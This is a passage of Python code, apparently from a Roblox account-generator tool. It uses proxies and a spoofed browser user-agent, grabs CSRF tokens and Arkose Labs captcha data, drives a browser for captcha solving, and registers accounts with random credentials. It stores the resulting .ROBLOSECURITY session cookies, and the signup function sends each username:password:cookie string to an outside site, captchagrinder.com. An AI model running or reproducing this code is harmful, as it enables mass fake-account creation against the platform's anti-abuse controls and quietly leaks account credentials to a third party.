  JSONSignup = {
            "agreementIds":[
                "848d8d8f-0e33-4176-bcd9-aa4e22ae7905",
                "54d8a8f0-d9c8-4cf3-bd26-0cbf8af0bba3"
            ],

            "birthday":"21 Sep 2006",
            "context":"MultiverseSignupForm",
            "displayAvatarV2":False,
            "displayContextV2":False,
            "gender":2,
            "isTosAgreementBoxChecked":True,
            "password":'testpasswordrec',
            "username":''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=10)),
            "referralData":None,
            'abTestVariation':0
        }

        session.proxies = proxy
        session.headers = {
            'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.30'
        }

        site_token = session.post(
            'https://auth.roblox.com/v1/usernames/validate'
        ).headers['x-csrf-token']
        
        captchaDetails = session.post(
            'https://auth.roblox.com/v2/signup',

            headers = session.headers.update({
                'x-csrf-token':site_token
            }),
        
            json = JSONSignup

        ).json()['failureDetails'][0]['fieldData'].split(',')

        captchaId = captchaDetails[0]
        captchaBlob = captchaDetails[1]

        session.headers = {
            'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.30',
            'origin':'https://www.roblox.com',
            'referer':'https://www.roblox.com/'
        }

        getToken = session.post(
            'https://roblox-api.arkoselabs.com/fc/gt2/public_key/A2A14B1D-1AF3-C791-9BBC-EE33CC7A0A6F',

            data = {
                'public_key':'A2A14B1D-1AF3-C791-9BBC-EE33CC7A0A6F',
                'userbrowser': session.headers['user-agent'],
                'rnd':f'0.{random.randint(1000,10000000)}',
                'data[blob]':captchaBlob,
                'language':'en'
            }
        ).json()['token']

    return {'token':getToken, 'captchaId':captchaId, 'captchaBlob':captchaBlob}


def signup_roblox(captchaId, captcha_token):
    with requests.session() as session:

     
        username = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=random.randint(7, 19)))
        password = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=10))

        session.headers['x-csrf-token'] = session.post(
            'https://auth.roblox.com/v1/usernames/validate'
        ).headers['x-csrf-token']

        session.headers['referer'] = 'https://www.roblox.com/'
        session.headers['origin'] = 'https://www.roblox.com'

        JSONSignup = {
            "agreementIds":[
                "848d8d8f-0e33-4176-bcd9-aa4e22ae7905",
                "54d8a8f0-d9c8-4cf3-bd26-0cbf8af0bba3"
            ],

            "birthday":"21 Sep 2006",
            "context":"MultiverseSignupForm",
            "displayAvatarV2":False,
            "displayContextV2":False,
            "gender":2,
            "isTosAgreementBoxChecked":True,
            "password":password,
            "username":username,
            "referralData":None,
            'abTestVariation':0,
            'captchaId':captchaId,
        }

        JSONSignup.update({"captchaProvider":"PROVIDER_ARKOSE_LABS", "captchaToken":str(captcha_token)})

        create = session.post(
            'https://auth.roblox.com/v2/signup',

            json = JSONSignup

        )

        print('\n\n' + str(JSONSignup) + '\n\n')

        if create.status_code == 200:
            print(create.text)
            cookie = session.cookies['.ROBLOSECURITY']
            writer = f'{cookie}'

            if config['settings'][0]['cookie_gen']['upc'] == True:
                writer = username + ':' + password + ':' + cookie

            open(config['settings'][0]['cookie_gen']['output'], 'a').write(writer+'\n')

            report = session.patch(
                'https://captchagrinder.com/api/report',

                data = {
                    'blob':f'{username}:{password}:{cookie}'
                }
            )





def solve_captcha(token, captchaId, captchaBlob):
    browser = config['settings'][0]['cookie_gen']['browser']
    driver = autoselenium.Driver(browser)    
    location = token.split('|')[1]
    token_id = token.split('|')[0]
    solver_url = f'https://roblox-api.arkoselabs.com/fc/gc/?token={token_id}&{location}&lang=en&pk=A2A14B1D-1AF3-C791-9BBC-EE33CC7A0A6F&cdn_url=https%3A%2F%2Froblox-api.arkoselabs.com%2Fcdn%2Ffc'
    print(f'- Received Captcha Details!\n\n\nCaptchaId : {captchaId}\nCaptchaBlob : {captchaBlob}\nLocation : {location}\ntoken : {token_id}\n\n\n(Starting selenium browser to solve the captcha)..\n\n\n')
    driver.get(solver_url)
    time.sleep(3)
    print('\n\n[PRESS ENTER]: Press return/enter key on your keyboard if you finished the captcha!')
    input()
    driver.quit()
    threading.Thread(target=signup_roblox, args=(captchaId, token,)).start()
